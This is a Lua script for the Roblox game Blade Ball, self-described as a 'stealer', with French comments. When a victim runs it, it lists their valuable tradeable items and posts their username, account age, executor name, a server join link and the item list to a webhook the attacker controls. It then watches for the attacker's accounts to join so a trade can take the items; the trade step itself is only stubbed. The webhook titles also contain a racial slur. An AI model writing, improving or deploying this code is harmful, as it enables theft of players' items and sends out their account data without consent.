-- Configuration
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or "" -- TON URL CLOUDFLARE WORKER
local auth_token = _G.AuthToken or "EBK-SS-A" 

---------------------------------------------------------
-- FONCTIONS CORE (Toutes celles de ton image)
---------------------------------------------------------

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getExecutor()
    return identifyexecutor and identifyexecutor() or "Unknown"
end

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return nameToRAP end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, cat in ipairs(categories) do rapMappings[cat] = buildNameToRAPMap(cat) end

local function getRAP(category, itemName)
    return rapMappings[category] and rapMappings[category][itemName] or 0
end

---------------------------------------------------------
-- WEBHOOKS CORRIGÉS (AVEC LIEN ET THUMBNAIL)
---------------------------------------------------------

local function SendWebhook(title, color, isStart)
    local itemLines = ""
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do
        itemLines = itemLines .. "• " .. item.Name .. " - " .. formatNumber(item.RAP) .. " RAP\n"
        totalRAP = totalRAP + item.RAP
    end

    local fields = {}
    
    -- Info Joueur
    table.insert(fields, {
        name = "ℹ️ Player info:",
        value = "```\n🆔 Username: "..plr.Name.."\n👤 Display: "..plr.DisplayName.."\n📅 Age: "..plr.AccountAge.." Days\n⚡ Executor: "..getExecutor().."```",
        inline = false
    })

    -- LIEN DE JOIN (Corrigé)
    table.insert(fields, {
        name = "Join link 🔗:",
        value = "[Click to Join Server](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ")",
        inline = false
    })

    -- Liste d'items
    table.insert(fields, {
        name = "Item list 📝:",
        value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```",
        inline = false
    })

    -- Summary
    table.insert(fields, {
        name = "Summary 💰:",
        value = "```Total RAP: " .. formatNumber(totalRAP) .. "```",
        inline = false
    })

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (isStart and ping == "Yes") and "@everyone | game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')" or nil,
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = fields,
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }

    local success, response = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

---------------------------------------------------------
-- LOGIQUE DE LANCEMENT
---------------------------------------------------------

-- Remplissage de la liste d'items
for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = getRAP(category, itemInfo.Name)
            if rap >= min_rap then
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    
    -- Premier message (VIOLET) avec lien et photo
    SendWebhook("🟣 Bro join your hit nigga 🎯", 8323327, true)

    -- Détection de ton arrivée
    local notified = false
    Players.PlayerAdded:Connect(function(player)
        if table.find(users, player.Name) and not notified then
            notified = true
            SendWebhook("✅ The nigga is on the server ! 🎉", 65280, false)
            -- Lancer doTrade ici...
        end
    end)
end
